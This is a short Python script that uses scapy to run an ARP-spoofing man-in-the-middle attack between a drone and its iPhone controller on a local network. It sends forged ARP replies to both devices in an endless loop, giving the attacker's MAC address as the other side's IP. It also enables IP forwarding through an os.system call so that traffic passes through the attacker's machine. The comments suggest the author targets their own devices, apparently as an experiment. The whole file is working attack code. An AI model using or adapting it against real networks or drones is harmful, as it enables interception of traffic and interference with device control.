from scapy.all import *
import os
 
def spoof_victim(iphone_MAC, iphone_IP, droneIP_spoof, my_MAC):
	print( "Creating packet and sending to victim .." )
	ethernet=Ether(dst=iphone_MAC) # Ethernet header
	arp= ARP(pdst=iphone_IP, psrc=droneIP_spoof, hwsrc= my_MAC) # arp Frame to trick victim controller
	conc=ethernet/arp #concatenate ethernet header with ARP frame
	srp1(conc, timeout =2, verbose=0) # sending packet with custom ethernet layer to create link layer 2 packet
	#srp1(Ether(dst=iphone_MAC)/ARP(pdst=iphone_IP, psrc=droneIP_spoof, hwsrc=my_MAC), timeout=2, verbose = 0)
 
def spoof_drone(drone_MAC, drone_IP, iphoneIP_spoof, my_MAC):
	print ("Creating packet and sending to drone ..") 
	ethernet=Ether(dst=drone_MAC) # Ethernet header
	arp= ARP(pdst=drone_IP, psrc=iphoneIP_spoof, hwsrc=my_MAC) # arp fram to trick drone
	conc= ethernet/arp # concatenate ethernet header with ARP frame to creat link layer 2 packer
	srp1(conc,timeout=2, verbose=0)# sending packet with custom ethernet layer
	#srp1(Ether(dst=drone_MAC)/ARP(pdst=drone_IP, psrc=iphoneIP_spoof, hwsrc=my_MAC), timeout=2, verbose = 0)
 

iphone_IP = "192.168.42.59" # input controller ip address  I used my Iphone's ios controller
iphone_MAC = "1C:36:BB:DF:E5:3B" # MAC address for my controller

droneIP_spoof = "192.168.42.1" # Spoofed IP address of the Drone to pretend that MITM is the real ap
iphoneIP_spoof = "192.168.42.59"# spoofed IP address for the controller

my_MAC = "00:0c:29:74:03:8b" # real MAC address

drone_IP = "192.168.42.1" # Drone's IP address
drone_MAC = "A0:14:3D:69:4F:04" # Drone's MAC address
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") #enable port forwading
 
while True: # spam packets
	spoof_victim(iphone_MAC, iphone_IP, droneIP_spoof, my_MAC)
	spoof_drone(drone_MAC, drone_IP, iphoneIP_spoof, my_MAC)
